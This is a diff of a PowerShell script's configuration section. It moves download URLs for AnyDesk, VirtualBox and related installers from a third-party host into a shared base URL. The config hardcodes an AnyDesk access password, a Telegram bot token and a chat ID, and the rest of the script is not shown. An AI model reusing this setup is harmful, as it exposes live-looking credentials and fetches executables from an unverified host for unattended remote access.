@@ -1,20 +1,23 @@
-
 # =========================
 #      CONFIG (PLAINTEXT)
 # =========================
 
 # -- IMPORTANT: Ensure these placeholders are replaced with your ACTUAL plaintext values if necessary --
 # -- However, the script now assumes these are correctly set and won't check for "REPLACE_WITH..." strings --
-$anydeskUrl = "http://sh.itpcloud.biz/anydesk.exe"
+
+$baseUrl = "http://sh.itpcloud.biz/" # Define the base URL once
+
+$anydeskUrl = $baseUrl + "anydesk.exe"
+$vcredistUrl = $baseUrl + "vcredistx64.exe"
+$vboxUrl = $baseUrl + "virtualbox.exe"
+$vboxExtUrl = $baseUrl + "Oracle_VirtualBox_Extension_Pack-7.1.6.vbox-extpack"
+
 $anydeskPassword = "hype1234"
 $telegramBotToken = "5713387645:AAEnE0skfvLy5FmTRs0RwX9gLz9avFj72Wk"
 $telegramChatId = "456050407"
-$vcredistUrl = "http://sh.itpcloud.biz/vcredistx64.exe"
-$vboxUrl = "http://sh.itpcloud.biz/virtualbox.exe"
-$vboxExtUrl = "http://sh.itpcloud.biz/Oracle_VirtualBox_Extension_Pack-7.1.6.vbox-extpack"
 
 $debugMode = $false
-$scriptVersion = "1.0.2" # Updated version due to encryption removal
+$scriptVersion = "1.0.3" # Updated version due to URL refactoring
 
 # =========================
 #   WELCOME MESSAGE
@@ -858,4 +861,4 @@ while ($true) {
     }
 }
 exit 0
-test
+# The 'test' at the end of the original file was removed as it's not valid PowerShell outside a string/comment.
